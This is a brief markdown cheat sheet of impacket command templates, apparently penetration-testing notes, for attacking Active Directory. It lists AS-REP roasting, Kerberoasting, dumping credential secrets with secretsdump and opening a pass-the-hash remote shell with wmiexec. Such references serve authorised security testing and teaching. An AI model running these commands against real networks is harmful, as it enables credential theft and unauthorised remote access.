# impacket

collection of tools for working with network protocols

## SMB server

* experimental SMBv2 support

```
sudo smbserver.py -smb2support <share name> <path>
```

## get list of users that do not require Kerberos Pre-Authentication

export their TGTs for cracking

```
GetNPUsers.py -no-pass -usersfile <users> -dc-ip <domain controller> <domain>/
```

## Kerberoasting

get list of "service" accounts (i.e. ordinary *user* accounts associated with a particular service) and export their TGTs for cracking

```
GetUserSPNs.py -dc-ip <domain controller> -request <domain>/<username>:<password>
```

## dump secrets

```
secretsdump.py <username>:<password>@<host>
```

## execute a semi-interactive shell using WMI

* pass the hash

```
wmiexec.py -hashes [LM]:<NTLM> <domain>/<user>:<password>@<host>
```

## [...](https://github.com/SecureAuthCorp/impacket)
